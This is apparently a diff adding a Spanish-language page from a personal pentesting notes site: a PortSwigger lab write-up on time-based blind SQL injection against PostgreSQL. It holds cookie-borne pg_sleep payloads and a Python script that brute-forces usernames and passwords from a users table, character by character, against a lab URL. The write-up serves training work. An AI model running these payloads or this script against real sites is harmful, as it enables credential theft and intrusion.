@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;Postgres detectado&lt;/p&gt;&lt;div class=&quot;language-r highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;TrackingId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SELECT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pg_sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+--+-&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>Postgres detectado</p>
+<div class="language-r highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">TrackingId</span><span class="o">=</span><span class="err">'</span><span class="o">%</span><span class="m">3</span><span class="n">b</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="n">pg_sleep</span><span class="p">(</span><span class="m">5</span><span class="p">)</span><span class="o">+--+-</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-R highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">TrackingId</span><span class="o">=</span><span class="err">'</span><span class="o">%</span><span class="m">3</span><span class="n">b</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="n">CASE</span><span class="o">+</span><span class="n">WHEN</span><span class="o">+</span><span class="p">(</span><span class="m">1</span><span class="o">=</span><span class="m">1</span><span class="p">)</span><span class="o">+</span><span class="n">THEN</span><span class="o">+</span><span class="n">pg_sleep</span><span class="p">(</span><span class="m">10</span><span class="p">)</span><span class="o">+</span><span class="n">ELSE</span><span class="o">+</span><span class="n">pg_sleep</span><span class="p">(</span><span class="m">0</span><span class="p">)</span><span class="o">+</span><span class="n">END</span><span class="o">+--+-</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Para extraer la primera letra de la tupla (username:password) de la primera fila de la tabla users :</p>
+<div class="language-r highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">TrackingId</span><span class="o">=</span><span class="s1">'%3b+SELECT+CASE+WHEN+(SELECT+SUBSTRING((username||'</span><span class="o">:</span><span class="s1">'||password),1,1)+FROM+users+LIMIT+1+OFFSET+0)='</span><span class="n">a</span><span class="err">'</span><span class="o">+</span><span class="n">THEN</span><span class="o">+</span><span class="n">pg_sleep</span><span class="p">(</span><span class="m">10</span><span class="p">)</span><span class="o">+</span><span class="n">ELSE</span><span class="o">+</span><span class="n">pg_sleep</span><span class="p">(</span><span class="m">0</span><span class="p">)</span><span class="o">+</span><span class="n">END</span><span class="o">+--+-</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Modificamos un poco el script :</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="n">asyncio</span> <span class="kn">import</span> <span class="n">log</span>
+<span class="kn">import</span> <span class="n">string</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="n">requests</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">pdb</span><span class="p">,</span> <span class="n">urllib3</span>
+<span class="kn">from</span> <span class="n">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>
+
+<span class="k">def</span> <span class="nf">sig_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n\n</span><span class="s">[!] Saliendo...</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">signal</span><span class="p">.</span><span class="nf">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">)</span>
+
+<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span>
+<span class="p">}</span>
+
+<span class="c1">#Variables Globales
+</span><span class="n">characters</span><span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="sh">'</span><span class="s">_</span><span class="sh">'</span> <span class="o">+</span> <span class="sh">'</span><span class="s">:</span><span class="sh">'</span>
+<span class="n">url</span><span class="o">=</span> <span class="sh">"</span><span class="s">https://0a66001a03871f8080dcfd6d00a70015.web-security-academy.net/product?productId=4</span><span class="sh">"</span>
+
+<span class="k">def</span> <span class="nf">makeSQLI</span><span class="p">():</span>
+	<span class="n">s</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="nf">session</span><span class="p">()</span>
+	<span class="n">s</span><span class="p">.</span><span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span>
+
+	<span class="n">p1</span><span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="sh">"</span><span class="s">Fuerza Bruta</span><span class="sh">"</span><span class="p">)</span>
+	<span class="n">p1</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="sh">"</span><span class="s">Iniciando proceso de fuerza bruta</span><span class="sh">"</span><span class="p">)</span>
+
+	<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+	<span class="n">p2</span><span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="sh">"</span><span class="s">Contenido</span><span class="sh">"</span><span class="p">)</span>
+
+	<span class="n">resultado</span><span class="o">=</span> <span class="sh">""</span>
+	
+	<span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+
+	<span class="k">for</span> <span class="n">offset</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">):</span>
+		<span class="n">found</span><span class="o">=</span><span class="bp">True</span>
+		<span class="n">position</span><span class="o">=</span><span class="mi">1</span>
+		<span class="k">while</span> <span class="n">found</span> <span class="p">:</span>
+			<span class="n">found</span><span class="o">=</span><span class="bp">False</span>
+			<span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">characters</span><span class="p">:</span>
+				<span class="n">payload</span><span class="o">=</span><span class="sa">f</span><span class="sh">"'</span><span class="s">%3b+SELECT+CASE+WHEN+(SELECT+SUBSTRING((username||</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="s">||password),</span><span class="si">{</span><span class="n">position</span><span class="si">}</span><span class="s">,1)+FROM+users+LIMIT+1+OFFSET+</span><span class="si">{</span><span class="n">offset</span><span class="si">}</span><span class="s">)=</span><span class="sh">'</span><span class="si">{</span><span class="n">character</span><span class="si">}</span><span class="sh">'</span><span class="s">+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+--+-</span><span class="sh">"</span>
+				<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+					<span class="sh">"</span><span class="s">TrackingId</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span>
+					<span class="sh">"</span><span class="s">session</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">I5DWDF9YEA5TdRe9OAa9wnzttWZfDzvw</span><span class="sh">"</span>
+				<span class="p">}</span>
+				<span class="n">p1</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+				<span class="c1">#url = quote(url, safe=':/?&amp;=.,')
+</span>
+				<span class="n">time_start</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
+				<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
+				<span class="n">time_end</span><span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
+
+				<span class="k">if</span> <span class="n">time_end</span> <span class="o">-</span><span class="n">time_start</span> <span class="o">&gt;</span> <span class="mi">5</span><span class="p">:</span>
+					<span class="n">resultado</span> <span class="o">+=</span> <span class="n">character</span>
+					<span class="n">p2</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="n">resultado</span><span class="p">)</span>
+					<span class="n">position</span><span class="o">+=</span><span class="mi">1</span>
+					<span class="n">found</span><span class="o">=</span><span class="bp">True</span>
+					<span class="k">break</span>
+		<span class="n">resultado</span><span class="o">+=</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+	<span class="nf">makeSQLI</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
